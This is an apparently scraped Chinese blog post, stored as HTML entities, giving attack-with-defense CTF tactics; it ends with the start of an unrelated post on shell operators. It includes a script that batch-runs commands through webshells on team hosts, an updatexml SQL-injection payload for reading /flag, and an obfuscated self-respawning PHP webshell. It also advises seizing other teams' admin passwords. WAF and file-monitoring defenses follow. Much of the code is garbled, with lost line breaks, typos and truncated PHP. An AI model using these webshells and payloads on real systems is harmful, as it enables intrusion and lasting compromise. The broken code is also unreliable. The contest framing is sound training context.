Web&#x540E;&#x53F0;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x5F31;&#x53E3;&#x4EE4;&#xFF0C;&#x4E00;&#x822C;&#x90FD;&#x662F;admin\\admin,admin\\123456,test\\test&#x7B49;&#x7B49;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4FEE;&#x6539;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;&#x540E;&#x53F0;&#x53E3;&#x4EE4;&#xFF0C;&#x4E3A;&#x672C;&#x961F;&#x6240;&#x7528;&#xFF0C;&#x8BF4;&#x4E0D;&#x5B9A;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x540E;&#x53F0;getshell&#xFF0C;&#x6BD4;&#x5982;&#x5341;&#x5206;&#x5E38;&#x89C1;&#x7684;WordPress&#x3002; &#x9884;&#x7559;&#x540E;&#x95E8;&#x5728;&#x7EF4;&#x62A4;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x5F88;&#x6709;&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x9884;&#x7559;&#x4E86;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A;&#x540E;&#x95E8;&#xFF0C;&#x6BD4;&#x5982;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x8FD9;&#x662F;&#x4E2A;&#x9001;&#x5206;&#x9898;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x8FC5;&#x901F;&#x6253;&#x4E00;&#x6CE2;&#xFF0C;&#x8FD8;&#x53EF;&#x4EE5;&#x89C6;&#x60C5;&#x51B5;&#x201C;&#x6405;&#x5C4E;&#x201D;&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x4E00;&#x76F4;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x6BCF;&#x8F6E;&#x90FD;&#x5F97;&#x5206;&#xFF08;&#x540E;&#x9762;&#x7EC6;&#x8BF4;&#xFF09;&#x5C06;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x8F7D;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x5229;&#x7528;D&#x76FE;&#x626B;&#x63CF;&#xFF0C;&#x4E00;&#x822C;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF1A; D-dun &#x53D1;&#x73B0;&#x540E;&#x95E8;&#xFF0C;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5220;&#x9664;&#xFF0C;&#x540C;&#x65F6;&#x5229;&#x7528;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x53D1;&#x8D77;&#x7B2C;&#x4E00;&#x6CE2;&#x653B;&#x51FB;&#xFF0C;&#x5982;&#x679C;&#x5229;&#x7528;&#x83DC;&#x5200;&#x8FDE;&#xFF0C;&#x663E;&#x7136;&#x4E0D;&#x591F;&#x4F18;&#x96C5;&#xFF0C;&#x8FD8;&#x6CA1;&#x8FDE;&#x5B8C;&#xFF0C;&#x4EBA;&#x5BB6;&#x4F30;&#x8BA1;&#x90FD;&#x5220;&#x7684;&#x5DEE;&#x4E0D;&#x591A;&#x4E86;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x867D;&#x7136;&#x662F;&#x9001;&#x5206;&#x9898;&#xFF0C;&#x4F46;&#x6709;&#x65F6;&#x62FC;&#x7684;&#x662F;&#x624B;&#x901F;&#xFF0C;&#x56E0;&#x6B64;&#x5F97;&#x63D0;&#x524D;&#x51C6;&#x5907;&#x597D;&#x811A;&#x672C;&#xFF1A;123456789101112131415161718192021222324#coding=utf-8import requestsurl=&quot;http://192.168.71.&quot;url1=&quot;&quot;shell=&quot;/Upload/index.php&quot;passwd=&quot;abcde10db05bd4f6a24c94d7edde441d18545&quot;port=&quot;80&quot;payload = {passwd: &apos;system(\\&apos;cat /flag\\&apos;);&apos;}f=open(&quot;webshelllist.txt&quot;,&quot;w&quot;)f1=oepn(&quot;firstroud_flag.txt&quot;,&quot;w&quot;)for i in[51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]: url1=url+str(i)+&quot;:&quot;+port+shell try: res=requests.post(url1,payload,timeout=1) if res.status_code == requests.codes.ok: print url1+&quot; connect shell sucess, flag is &quot;+res.text print &gt;&gt;f1,url1+&quot; connect shell sucess, flag is &quot;+res.text print &gt;&gt;f,url1+&quot;,&quot;+passwd else: print &quot;shell not found!&quot; except: print url1+&quot; connect shell fail&quot;f.close()f1.close() &#x914D;&#x7F6E;&#x4E00;&#x4E0B;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x5730;&#x5740;&#x3001;shell&#x8DEF;&#x5F84;&#x548C;&#x5BC6;&#x7801;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF0C;&#x53D1;&#x4E86;&#x4E2A;&#x8BB0;&#x5F55;&#x5728;firstround_flag.txt&#x4E2D;&#xFF0C;&#x67D0;&#x6B21;&#x6BD4;&#x8D5B;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x5982;&#x4E0B;&#xFF1A; flag &#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x5E38;&#x89C1;&#x6F0F;&#x6D1E;&#x5305;&#x62EC;SQL&#x6CE8;&#x5165;&#x3001;&#x6587;&#x4EF6;&#x5305;&#x62EC;&#x3001;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x7B49;&#x7B49;&#x3002;&#x5BF9;&#x4E8E;SQL&#x6CE8;&#x5165;&#x7C7B;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x6709;&#x8FC7;&#x6EE4;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;sqlmap&#x8DD1;&#x51FA;&#x6765;&#xFF0C;&#x5728;&#x5229;&#x7528;-sql-shell&#x6267;&#x884C;&#xFF0C;select load_file(&apos;/flag&apos;);&#x5373;&#x53EF;&#x5F97;&#x5230;flag&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5229;&#x7528;into outfile&#x5199;&#x6728;&#x9A6C;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x5F39;&#x836F;&#x6839;&#x636E;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x9047;&#x5230;&#x6743;&#x9650;&#x95EE;&#x9898;&#x3002;&#x7528;sqlmap&#x8DD1;&#x6BD4;&#x8F83;&#x8017;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x5229;&#x7528;payload&#x5199;&#x4E00;&#x4E2A;python&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FDB;&#x884C;&#x653B;&#x51FB;&#xFF1A;12345678910def sqli(host): global sess_admin date = {&quot;section_name&quot;;&quot;asd&quot;,&quot;admin_name&quot;}: &quot; &apos;||(SELECT updatexml(1,concat(0x7e,(select load_file(&apos;/flag&apos;)),0x7e),1))||&apos;&quot;,&quot;announcement&quot;;&quot;asd&quot; r = sess_admin.post(&apos;http://%s/index.php/section/add&apos;%host,data=data) flags = re.findall(r&apos;~(.+?)~&apos;,r.content) if flags: return flags[0] else: return &quot;error pwn!&quot; &#x4E0A;&#x4F20;&#x6F0F;&#x6D1E;&#x4E00;&#x822C;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x7B80;&#x5355;&#x7684;&#x9ED1;&#x540D;&#x5355;&#x8FC7;&#x6EE4;&#x3001;&#x670D;&#x52A1;&#x5668;&#x89E3;&#x6790;&#x6F0F;&#x6D1E;&#x7B49;&#x7B49;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4E0A;&#x4F20;&#x6728;&#x9A6C;&#xFF1B; &#x4E94;&#x3001;&#x6743;&#x9650;&#x7EF4;&#x6301;&#x8FD9;&#x91CC;&#x8BF4;&#x7684;&#x65B9;&#x6CD5;&#x5C31;&#x6BD4;&#x8F83;&#x201C;&#x6405;&#x5C4E;&#x201D;&#x4E86;&#xFF0C;&#x4E0A;&#x9762;&#x8BF4;&#x5230;&#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x53EF;&#x4EE5;&#x7EF4;&#x6301;&#x6743;&#x9650;&#xFF0C;&#x4E3B;&#x8981;&#x54DF;&#x4E24;&#x79CD;&#xFF0C;&#x4E00;&#x79CD;&#x662F;&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201D;&#xFF0C;&#x53E6;&#x4E00;&#x79CD;&#x662F;&#x53CD;&#x5F39;shell &#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201D;1234567891011&lt;?php set_time_limit(0); ignore_user_abort(1); unlink(__FILE__); while(1){ file_put_contents(&apos;./.config.php&apos;,&apos;&lt;?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97.$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(101).$uU(97)?&gt;&apos;); system(&apos;chmod 777 .config.php&apos;); touch(&quot;./.config.php&quot;,mktime(20,15,1,11,28,2016)); usleep(100); } ?&gt; &#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#xFF0C;&#x4E0A;&#x4F20;&#x4E0A;&#x9762;&#x7684;&#x201C;&#x4E0D;&#x6B7B;&#x9A6C;&#x201C;&#x5E76;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x4F1A;&#x4E00;&#x76F4;&#x751F;&#x6210;.config.php&#x7684;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#xFF0C;&#x6728;&#x9A6C;&#x5185;&#x5BB9;&#x53EF;&#x4EE5;&#x81EA;&#x4FEE;&#x4FEE;&#x6539;&#xFF0C;&#x53EA;&#x8981;&#x522B;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x770B;&#x61C2;&#x5C31;&#x884C;&#xFF0C;&#x54C8;&#x54C8;&#x54C8; &#x201C;&#x53CD;&#x5F39;shell&#x201D;123&lt;?php ?&gt; &#x5229;&#x7528;&#x9884;&#x7559;&#x540E;&#x95E8;&#x4E0A;&#x4F20;&#x4E0A;&#x9762;&#x7684;php&#x6587;&#x4EF6;&#x5E76;&#x8BBF;&#x95EE;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x7528;nc&#x53CD;&#x5F39;shell&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x53EF;&#x4EE5;&#x4E00;&#x76F4;&#x5F97;&#x5206;&#x4E86; php &#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x4E0A;&#x9762;&#x7684;2&#x4E2D;&#x65B9;&#x6CD5;&#xFF0C;&#x9700;&#x8981;&#x7F51;&#x7AD9;&#x7684;&#x6743;&#x9650;&#x4E3A;www-data,&#x5982;&#x679C;&#x7F51;&#x7AD9;&#x7684;&#x6743;&#x9650;&#x662F;ctf&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x6CA1;&#x6709;&#x6743;&#x9650;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x3002; &#x516D;&#x3001; &#x901A;&#x7528;&#x9632;&#x5FA1;&#x5BF9;&#x4E8E;&#x9632;&#x5FA1;&#xFF0C;&#x4E00;&#x822C;&#x901A;&#x7528;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x6CD5;&#xFF1A;WAF&#x3001;&#x6587;&#x4EF6;&#x76D1;&#x63A7;1. WAF &#x4F7F;&#x7528;&#x65B9;&#x6CD5;&#xFF1A; &#x5C06;waf.php&#x4F20;&#x5230;&#x8981;&#x5305;&#x542B;&#x7684;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55; &#x5728;&#x9875;&#x9762;&#x4E2D;&#x52A0;&#x5165;&#x9632;&#x62A4;&#xFF0C;&#x54DF;&#x4E24;&#x79CD;&#x505A;&#x6CD5;&#xFF0C;&#x6839;&#x636E;&#x60C5;&#x51B5;&#x4E8C;&#x9009;&#x4E00;&#x5373;&#x53EF;&#xFF1A;a).&#x5728;&#x6240;&#x9700;&#x8981;&#x9632;&#x62A4;&#x7684;&#x9875;&#x9762;&#x52A0;&#x5165;&#x4EE3;&#x7801;require_once(&apos;waf.php&apos;);&#x5C31;&#x53EF;&#x4EE5;&#x505A;&#x5230;&#x9875;&#x9762;&#x9632;&#x6CE8;&#x5165;&#x3001;&#x8DE8;&#x7AD9;&#x5982;&#x679C;&#x60F3;&#x6574;&#x7AD9;&#x9632;&#x6CE8;&#xFF0C;&#x5C31;&#x5728;&#x7F51;&#x7AD9;&#x7684;&#x4E00;&#x4E2A;&#x516C;&#x7528;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x5982;&#x6570;&#x636E;&#x5E93;&#x94FE;&#x63A5;&#x6587;&#x4EF6;config.icn.php&#x4E2D;&#xFF01;&#x6DFB;&#x52A0;require_once(&apos;waf.php&apos;);&#x6765;&#x8C03;&#x7528;&#x4EE3;&#x7801;&#x5E38;&#x7528;php&#x7CFB;&#x7EDF;&#x6DFB;&#x52A0;&#x6587;&#x4EF6; PHPCMS v9 \\phpcms\\base.phpPHPWIND8.7 \\data\\sql_config.phpDEDECMS 5.7 \\data\\common.inc.phpDiscuz X2 \\config\\config.php_global.phpWordPress \\wp-config.phpMetinfo \\include\\head.php b). &#x5728;&#x6BCF;&#x4E2A;&#x6587;&#x4EF6;&#x6700;&#x524D;&#x52A0;&#x4E0A;&#x4EE3;&#x7801;&#x5728;php.ini&#x4E2D;&#x627E;&#x5230;12Automaticaly add files before or after any PHP document.auto_prepend_file = 360_safe3.php&#x8DEF;&#x5F84;&#xFF1B; &#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF0C;&#x90E8;&#x7F72;waf&#x53EF;&#x80FD;&#x4F1A;&#x5BFC;&#x81F4;&#x670D;&#x52A1;&#x4E0D;&#x53EF;&#x7528;&#xFF0C;&#x9700;&#x8981;&#x8C28;&#x614E;&#x90E8;&#x7F72;&#x3002; 2. &#x6587;&#x4EF6;&#x76D1;&#x63A7;&#x6587;&#x4EF6;&#x76D1;&#x63A7;&#x53EF;&#x4EE5;&#x5BF9;web&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x76D1;&#x63A7;&#xFF0C;&#x53D1;&#x73B0;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x6216;&#x8005;&#x88AB;&#x4FEE;&#x6539;&#x7ACB;&#x5373;&#x6062;&#x590D;&#xFF0C;&#x8FD9;&#x6837;&#x53EF;&#x4EE5;&#x9632;&#x6B62;&#x4E0A;&#x4F20;shell&#x7B49;&#x653B;&#x51FB;&#xFF1A;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173# -*- coding: utf-8 -*-#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = {} #&#x6587;&#x4EF6;MD5&#x5B57;&#x5178;ORIGIN_FILE_LIST = []#&#x7279;&#x6B8A;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x7B26;&#x4E32;Special_path_str = &apos;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&apos;bakstring = &apos;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&apos;logstring = &apos;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;webshellstring = &apos;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&apos;difffile = &apos;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&apos;Special_string = &apos;drops_log&apos; #&#x514D;&#x6B7B;&#x91D1;&#x724C;UNICODE_ENCODEING = &quot;utf-8&quot;INVALID_UNICODE_CHAR_FORMAT = r&quot;\\?%02x&quot;# &#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x5B57;&#x5178;spec_base_path = os.path.realpath(os.path.join(CWD,Special_path_str))Special_path = {&apos;bak&apos; : os.path.realpath(os.path.join(spec_base_path,bakstring)),&apos;log&apos; : os.path.realpath(os.path.join(spec_base_path,logstring)),&apos;webshell&apos; : os.path.realpath(os.path.join(spec_base_path,webshellstring)),&apos;diffile&apos; : os.path.realpath(os.path.join(spec_base_path,diffile)),}def isListLike(value): return isinstance(value, (list, tuple, set))# &#x83B7;&#x53D6;Unicode&#x7F16;&#x7801;def getUnicode(value, encoding=None, noneToNull=False): if noneTuNull and value is None: return noneTuNull if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value,unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start]+&quot;&quot;.join(INVALID_UNICODE_CAHR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors=&quot;ignore&quot;)# &#x76EE;&#x5F55;&#x521B;&#x5EFA;def mkdir_p(path): import errno try: os.makedirs(path) except OSRrror as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise# &#x83B7;&#x53D6;&#x5F53;&#x524D;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist# &#x8BA1;&#x7B97;&#x673A;&#x6587;&#x4EF6;MD5&#x503C;def calcMD5(filepath): try: with open(filepath,&apos;rb&apos;) as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u&apos;[!] getmd5_error : &apos;+getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(fielpath) FILE_MD5_DICT.pop(filepath,None) except KeyError, e: pass# &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;MD5def getfilemd5dict(filelist = []): filemd5dict = {} for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict# &#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6;def backup_file(filelist=[]): # if len(os.listdir(Special_path[&apos;bak&apos;])) == 0; for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepathm Special_path[&apos;bak&apos;])if __name__ == &apos;__main__&apos;: print u&apos;-------------start---------------&apos; for value in Special_path: mkdir_p(Special_path[value]) # &#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#xFF0C;&#x5E76;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x7684;MD5&#xFF0C;&#x540C;&#x4E8B;&#x5907;&#x4EFD;&#x6240;&#x6709;&#x6587;&#x4EF6; ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO &#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x4F1A;&#x4EA7;&#x751F;&#x91CD;&#x540D;BUG print u&apos;[*] pre work end!&apos; while True: file_lsit = getfilelist(CWD) # &#x79FB;&#x9664;&#x65B0;&#x4E0A;&#x4F20;&#x6587;&#x4EF6; diff_file_list = list(set(file_lsit) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, &apos;r&apos;).read() except Exception, e: break if Special_string not in f: try: print u&apos;[*] websehll find :&apos; + getUnicode(filepath) shutil.move(filepath,os.path.join(Special_path[&apos;webshell&apos;],ntpath.basename(filepath) + &apos;.txt&apos;)) except Exception as e: print u&apos;[!] move webshell error, &quot;%s&quot; maybe is webshell.&apos;%getUnicode(filepath) try: f = open(os.path.join(Special_path[&apos;log&apos;],&apos;log.txt&apos;),&apos;a&apos;) f.write(&apos;newfile: &apos; + getUnicode(filepath) = &apos; : &apos; + str(time.ctime()) + &apos;\\n&apos;) f.close() except Exception as e: print u&apos;[-] log error : file move error: &apos; + getUnicode(e)# &#x9632;&#x6B62;&#x4EFB;&#x610F;&#x6587;&#x4EF6;&#x88AB;&#x4FEE;&#x6539;&#xFF0C;&#x8FD8;&#x539F;&#x88AB;&#x4FEE;&#x6539;&#x6587;&#x4EF6;md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, &apos;r&apos;).read() except Exception, e: break if Special_string not in f: try: print u&apos;[*] file had be change : &apos; + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path[&apos;difffile&apos;], ntpath.basename(filekey) + &apos;.txt&apos;)) shutil.move(os.path.join(Special_path[&apos;bak&apos;], ntpath.basename(filekey)), filekey) except Exception as e: print u&apos;[!] move webshell error, &quot;%&quot; maybe is webshell.&apos;%getUnicode(filekey) try: f = open(os.path.join(Special_path[&apos;log&apos;],&apos;log.txt&apos;),&apos;a&apos;) f.write(&apos;diff_file: &apos; + getUnicode(filekey) + &apos; : &apos; + getUnicode(time.ctime()) + &apos;\\n&apos;) f.close() except Exception as e: print u&apos;[-] log error : done_diff: &apos; + getUnicode(filekey) passtime.sleep(2)#print `[*] &apos; + getUnicode(time.ctime()) &#x4E03;&#x3001;&#x81EA;&#x52A8;&#x63D0;&#x4EA4;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x53EA;&#x6709;&#x51E0;&#x5206;&#x949F;&#x4E00;&#x8F6E;&#xFF0C;&#x624B;&#x5DE5;&#x63D0;&#x4EA4;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;flag&#x663E;&#x7136;&#x4E0D;&#x884C;&#xFF0C;&#x9700;&#x8981;&#x51C6;&#x5907;&#x6279;&#x91CF;&#x63D0;&#x4EA4;flag&#x7684;&#x811A;&#x672C;&#xFF1A;123456789101112131415161718192021222324252627282930313233#!/usr/bin/env python2import sysimport jsonimport urllibimport httplibserver_host = &apos;10.10.0.2&apos;server_port = 80def submit(team_token, flag, host=server_host, port=server_port, timeout=5): if not team_token or not flag: raise Exception(&apos;team_token or flag not found&apos;) conn = httplib.HTTPConnection(host, port, timeout=timeout) params = urllib.urlencode({ &apos;token&apos;: team_token, &apos;flag&apos;: flag, }) headers = { &quot;Content-type&quot;: &quot;application/x-www-form-urlencoded&quot; } conn.request(&apos;POST&apos;, &apos;/api/submit_flag&apos;, params, headers) response = conn.getresponse() data - response.read() return json.loads(data)if __name__ == &apos;__main__&apos;: if len(sys.argv) &lt; 3: print &apos;usage: ./submitflag.py $team_token $flag&apos; sys.exit() host = server_host if len(sys.argv) &gt; 3: host = sys.argv[3] print json.dumps(submit(sys.argv[1],sys.argv[2], host=host), indent=4) &#x516B;&#x3001;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;&#x901A;&#x8FC7;&#x6D41;&#x91CF;&#x3001;&#x65E5;&#x5FD7;&#x7684;&#x5206;&#x6790;&#xFF1A; &#x611F;&#x77E5;&#x53EF;&#x80FD;&#x6B63;&#x5728;&#x53D1;&#x751F;&#x7684;&#x653B;&#x51FB;&#xFF0C;&#x4ECE;&#x800C;&#x89C4;&#x907F;&#x5B58;&#x5728;&#x7684;&#x5B89;&#x5168;&#x98CE;&#x9669; &#x5E94;&#x6025;&#x54CD;&#x5E94;&#xFF0C;&#x8FD8;&#x539F;&#x653B;&#x51FB;&#x8005;&#x7684;&#x653B;&#x51FB;&#x8DEF;&#x5F84;&#xFF0C;&#x4ECE;&#x800C;&#x633D;&#x56DE;&#x5DF2;&#x7ECF;&#x9020;&#x6210;&#x7684;&#x635F;&#x5931; &#x6700;&#x540E;&#x811A;&#x672C;&#x6E90;&#x7801;&#x94FE;&#x63A5; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"CTF","slug":"CTF","permalink":"https://marnm.github.io/tags/CTF/"},{"name":"信息安全","slug":"信息安全","permalink":"https://marnm.github.io/tags/信息安全/"},{"name":"网络空间安全","slug":"网络空间安全","permalink":"https://marnm.github.io/tags/网络空间安全/"},{"name":"Python","slug":"Python","permalink":"https://marnm.github.io/tags/Python/"}]},{"title":"Shell的基本运算符","date":"2018-08-10T14:18:16.000Z","path":"/posts/1fdc29d2/","text":"Shell &#x548C;&#x5176;&#x5B83;&#x7F16;&#x7A0B;&#x8BED;&#x8A00;&#x4E00;&#x6837;&#xFF0C;&#x652F;&#x6301;&#x591A;&#x79CD;&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5305;&#x62EC;&#xFF1A; &#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26; &#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26; &#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x7B26; &#x5B57;&#x7B26;&#x4E32;&#x8FD0;&#x7B97;&#x7B26; &#x6587;&#x4EF6;&#x6D4B;&#x8BD5;&#x8FD0;&#x7B97;&#x7B26;&#x539F;&#x751F;bash&#x4E0D;&#x652F;&#x6301;&#x7B80;&#x5355;&#x7684;&#x6570;&#x5B66;&#x8FD0;&#x7B97;&#xFF0C;&#x4F46;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5176;&#x5B83;&#x547D;&#x4EE4;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;&#x4F8B;&#x5982;awk&#x548C;expr&#x6700;&#x5E38;&#x7528;&#x3002;expr&#x662F;&#x4E00;&#x6B3E;&#x8868;&#x8FBE;&#x5F0F;&#x8BA1;&#x7B97;&#x5DE5;&#x5177;&#xFF0C;&#x4F7F;&#x7528;&#x5B83;&#x80FD;&#x5B8C;&#x6210;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x6C42;&#x503C;&#x64CD;&#x4F5C;&#x3002; &#x7B97;&#x6570;&#x8FD0;&#x7B97;&#x7B26;&#x76F8;&#x5F53;&#x4E8E;&#x5C0F;&#x5B66;&#x77E5;&#x8BC6; &#x8FD0;&#x7B97;&#x7B26; &#x8BF4;&#x660E; &#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7; + &#x52A0; `expr $a + $b`&#x7ED3;&#x679C;&#x4E3A;30 - &#x51CF; `expr $b - $a`&#x7ED3;&#x679C;&#x4E3A;10 * &#x4E58; `expr $a \\* $b`&#x7ED3;&#x679C;&#x4E3A;200 / &#x9664; `expr $b \\ $a`&#x7ED3;&#x679C;&#x4E3A;2 % &#x53D6;&#x4F59; `expr $a % $3`&#x7ED3;&#x679C;&#x4E3A;1 = &#x8D4B;&#x503C; `expr $a = $b`&#x7ED3;&#x679C;&#x4E3A;false == &#x7B49;&#x4E8E; `expr $a == $b`&#x7ED3;&#x679C;&#x4E3A;false != &#x4E0D;&#x7B49;&#x4E8E; `expr $a != $b`&#x7ED3;&#x679C;&#x4E3A;true &#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;&#x5173;&#x7CFB;&#x8FD0;&#x7B97;&#x7B26;&#x53EA;&#x652F;&#x6301;&#x6570;&#x5B57;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x9664;&#x975E;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x503C;&#x662F;&#x6570;&#x5B57;&#x3002; &#x8FD0;&#x7B97;&#x7B26; &#x8BF4;&#x660E; &#x4E3E;&#x4F8B;(a=10,b=20),``&#x4E0D;&#x662F;&#x5355;&#x5F15;&#x53F7; -eq &#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x6570;&#x662F;&#x5426;&#x76F8;&#x7B49;&#xFF0C;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true [ $a -ea $b]&#x8FD4;&#x56DE;false -ne &#x68C0;&#x6D4B;&#x4E24;&#x4E2A;&#x6570;&#x662F;&#x5426;&#x4E0D;&#x76F8;&#x7B49;,&#x4E0D;&#x76F8;&#x7B49;&#x8FD4;&#x56DE;true [ $a -ne $b ]&#x8FD4;&#x56DE;true -gt &#x68C0;&#x6D4B;&#x5DE6;&#x8FB9;&#x7684;&#x6570;&#x662F;&#x5426;&#x5927;&#x4E8E;&#x53F3;&#x8FB9;&#x7684;&#xFF0C;&#x662F;&#xFF0C;&#x5219;&#x8FD4;&#x56DE;true [ $a -gt $b ]&#x8FD4;&#x56DE;false -lt 